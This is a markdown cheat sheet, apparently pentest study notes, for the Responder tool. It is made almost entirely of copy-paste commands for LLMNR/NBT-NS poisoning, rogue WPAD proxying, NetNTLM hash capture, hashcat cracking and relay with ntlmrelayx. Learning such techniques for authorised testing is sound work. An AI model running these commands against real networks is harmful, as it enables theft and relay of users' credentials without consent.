# responder — LLMNR / NBT-NS / mDNS poisoner

> **Passive-to-active hash capture.** Answers broadcast name-resolution requests pretending to be the asked host, then harvests NetNTLM hashes when the victim tries to auth. Run on the same L2 segment as victims.

**Install check (Parrot — already installed):** `responder -h` or `/usr/share/responder/Responder.py`

---

## 🎯 Cheat-flow: "What do I run?"

| You need to... | Run this | Why |
|---|---|---|
| **Default poison + capture** | `sudo responder -I eth0` | Listen & poison |
| Verbose (see every query) | `sudo responder -I eth0 -v` | Troubleshoot |
| Analyze-only (no poison) | `sudo responder -I eth0 -A` | Passive recon |
| Force WPAD rogue proxy | `sudo responder -I eth0 -wFb` | Capture browser auth |
| Disable SMB/HTTP (for relay) | edit `/etc/responder/Responder.conf` → `SMB = Off`, `HTTP = Off` | Free ports for ntlmrelayx |
| Challenge for hashcat | default is `1122334455667788` | Matches mode 5600 |

---

## 🔑 Flags you must know cold

| Flag | Meaning |
|---|---|
| `-I <iface>` | **Interface** to listen on (required) |
| `-i <IP>` | Local IP to use in responses |
| `-A` | **Analyze mode** — watch but don't poison |
| `-w` | Start **WPAD rogue proxy** server |
| `-r` | Answer NBT-NS wildcard (workstation) queries |
| `-f` | **Fingerprint** the host that issued the query |
| `-F` | Force WPAD auth (basic) |
| `-b` | Use **basic HTTP auth** (cleartext creds) |
| `-v` | Verbose |
| `-d` | Answer DHCP requests (advanced) |
| `-P` | Force NTLM auth on proxy |
| `-Q` | Quiet skipped-answer logging |

Commonly combined: **`-wrf`** = WPAD + wildcard NBT + fingerprint.

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Standard capture run
sudo responder -I eth0 -wrf

# 2. Verbose (for demos / exam screenshots)
sudo responder -I eth0 -wrfv

# 3. Analyze only (see who's asking, no poisoning)
sudo responder -I eth0 -A

# 4. Where hashes land
ls -la /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt

# 5. Crack NetNTLMv2 with hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# 6. Crack NetNTLMv1 (if SMB1)
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# 7. Prep for NTLM relay (turn off SMB/HTTP)
sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo responder -I eth0 -wrf &
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## ⚠️ Gotchas

- **Run as root** (`sudo`) — needs raw sockets + port 445/139/80/53.
- **Interface must exist and be up** — `ip a` first. Wrong `-I` = silent failure.
- **Port 445 / 53 already in use?** — Samba or systemd-resolved is eating it. Stop them:
  `sudo systemctl stop smbd nmbd systemd-resolved`.
- **Hashes land in `/usr/share/responder/logs/`** — one file per protocol/victim IP.
- **NetNTLMv2 = hashcat `-m 5600`**, NetNTLMv1 = `-m 5500`. Don't mix them up.
- **You cannot pass-the-hash NetNTLMv2** — you must crack it, or **relay** it with `ntlmrelayx`.
- **For relay, turn OFF SMB and HTTP in Responder** so ntlmrelayx can bind those ports.
- **LLMNR disabled?** → hashes will never arrive. Check via `-A` mode first.
- **SMB signing required on target** → relay fails. Use `crackmapexec smb <range> --gen-relay-list`.

---

## 🔗 Related

- [impacket](./impacket.md) — `ntlmrelayx.py` for relay attacks
- [hashcat](./hashcat.md) — crack NetNTLMv1/v2 (`-m 5500` / `-m 5600`)
- [crackmapexec](./crackmapexec.md) — find signing-disabled relay targets
- [mitm-attacks playbook](../playbooks/mitm-playbook.md)
